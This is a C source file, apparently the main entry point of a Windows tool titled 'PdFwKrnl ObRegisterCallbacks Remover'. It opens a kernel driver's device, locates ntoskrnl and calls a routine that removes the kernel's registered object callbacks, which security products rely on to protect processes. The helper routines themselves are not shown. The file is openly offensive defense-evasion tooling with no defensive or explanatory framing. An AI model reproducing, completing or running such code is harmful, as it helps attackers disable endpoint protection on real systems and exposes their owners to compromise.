#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include "PdFwKrnl.h"
#include "Callbacks.h"

// -----------------------
// Entry Point
// -----------------------

INT wmain(VOID)
{
    HANDLE    hDev      = INVALID_HANDLE_VALUE;
    NTOS_INFO ntosInfo  = { 0 };
    HMODULE   hNtosUser = NULL;
    BOOL      bOk       = FALSE;

    printf("=== PdFwKrnl ObRegisterCallbacks Remover ===\n\n");

    hDev = OpenPdFwDevice();
    if (hDev == INVALID_HANDLE_VALUE)
        return 1;

    printf("[+] PdFwKrnl device opened\n\n");

    if (!GetNtoskrnlInfo(&ntosInfo))
    {
        printf("[-] GetNtoskrnlInfo failed\n");
        CloseHandle(hDev);
        return 1;
    }

    printf("[*] ntoskrnl base : 0x%016I64X\n", (ULONG64)ntosInfo.uBase);
    printf("[*] ntoskrnl size : 0x%016I64X\n", (ULONG64)ntosInfo.uSize);
    printf("[*] ntoskrnl path : %ls\n\n",       ntosInfo.wszPath);

    hNtosUser = LoadLibraryExW(ntosInfo.wszPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtosUser)
    {
        printf("[-] LoadLibraryExW failed: 0x%08lX\n", GetLastError());
        CloseHandle(hDev);
        return 1;
    }

    printf("[*] Removing ObRegisterCallbacks...\n");
    bOk = RemoveObCallbacks(hDev, hNtosUser, &ntosInfo);

    if (bOk)
        printf("\n[+] Done\n");
    else
        printf("\n[-] RemoveObCallbacks failed\n");

    FreeLibrary(hNtosUser);
    CloseHandle(hDev);
    return bOk ? 0 : 1;
}
